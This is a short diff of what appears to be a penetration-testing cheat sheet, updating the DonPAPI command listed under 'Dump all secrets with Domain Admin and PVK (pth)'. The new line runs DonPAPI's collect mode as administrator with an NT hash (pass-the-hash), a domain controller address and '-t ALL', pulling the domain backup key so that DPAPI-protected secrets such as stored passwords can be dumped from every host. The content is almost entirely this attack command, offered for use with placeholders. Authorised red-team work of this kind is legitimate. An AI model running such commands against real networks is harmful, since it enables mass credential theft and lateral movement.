@@ -38,5 +38,5 @@ DonPAPI -k <domain_fqdn>/<user>@<target>
 ## DonPAPI - Dump all secrets with Domain Admin and PVK (pth)
 run dpapi.py to get PVK
 ```
-DonPAPI -pvk <pvk_path> -o <out_path> --hashes <LM>:<NT> <domain_fqdn>/<user>@<target>
+DonPAPI  collect -d <domain_fqdn>  -u administrator --hashes :<nt_hash> --dc-ip <dc_ip> -t ALL --fetch-pvk 
 ```
